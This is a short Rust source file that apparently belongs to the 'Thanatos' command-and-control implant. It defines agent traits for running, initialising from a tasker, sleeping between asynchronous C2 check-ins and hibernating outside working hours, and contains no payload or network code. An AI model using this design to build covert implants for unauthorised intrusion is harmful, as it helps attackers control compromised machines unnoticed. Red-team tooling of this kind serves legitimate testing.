use agent_utils::errors::ThanatosError;

use crate::tasker::Tasker;

#[cfg(feature = "http")]
pub mod egress_agent;

#[cfg(feature = "tcp")]
pub mod p2p_agent;

/// Base definition for Agents. Each agent (egress, p2p) needs to implement a `run` and
/// `initialize` method.
pub trait CoreAgent {
    /// Runs the agent
    fn run(&mut self) -> Result<(), ThanatosError>;

    /// Initializes the agent from a command tasker
    fn initialize_from_tasker(_: Tasker) -> Result<Self, ThanatosError>
    where
        Self: Sized;
}

/// Base definition for `Egress` Agents. These agents do asynchronous C2 communications
/// so they require defining a sleep method.
pub trait EgressAgent: CoreAgent {
    /// Sleeps the agent
    fn sleep(&mut self);
}

pub trait P2PAgent: CoreAgent {
    /// Checks if the agent should sleep until the next working hours start
    fn hibernate(&mut self);
}
